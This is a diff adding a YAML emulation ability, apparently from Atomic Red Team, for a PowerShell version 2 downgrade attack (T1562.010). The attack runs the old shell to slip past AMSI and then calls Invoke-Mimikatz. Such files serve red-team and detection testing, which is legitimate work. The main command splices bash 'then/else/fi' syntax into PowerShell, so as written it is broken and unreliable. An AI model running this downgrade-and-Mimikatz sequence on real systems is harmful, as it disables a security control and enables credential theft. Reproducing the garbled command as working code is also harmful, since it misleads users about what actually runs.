@@ -1,0 +1,45 @@
+- id: 47c96489-2f55-4774-a6df-39faff428f6f
+  name: PowerShell Version 2 Downgrade
+  description: Executes outdated PowerShell Version 2 which does not support security
+    features like AMSI. By default the atomic will attempt to execute the cmdlet Invoke-Mimikatz
+    whether it exists or not, as this cmdlet will be blocked by AMSI when active.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1562.010
+    name: 'Impair Defenses: Downgrade Attack'
+  platforms:
+    windows:
+      psh:
+        command: '$v2_installed = PowerShell -version 2 -command ''$PSVersionTable.PSVersion.Major'';
+          if (-not $v2_installed) {exit 1} else {exit 0}; then : ; else echo "Manually
+          install PowerShell Version 2"; fi; PowerShell -version 2 -command ''Invoke-Mimikatz'''
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1562.010
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      v2_command:
+        description: Specify the command to execute with Version 2
+        type: string
+        default: Invoke-Mimikatz
+    dependencies:
+    - description: Check if Version 2 is installed.
+      prereq_command: '$v2_installed = PowerShell -version 2 -command ''$PSVersionTable.PSVersion.Major''
+
+        if (-not $v2_installed) {exit 1} else {exit 0}
+
+        '
+      get_prereq_command: 'echo "Manually install PowerShell Version 2"
+
+        '
+    technique_created: '2021-10-08T14:06:28.212Z'
+    atomic_guid: 47c96489-2f55-4774-a6df-39faff428f6f
+    import_timestamp: '2025-06-24T11:15:00.850581Z'
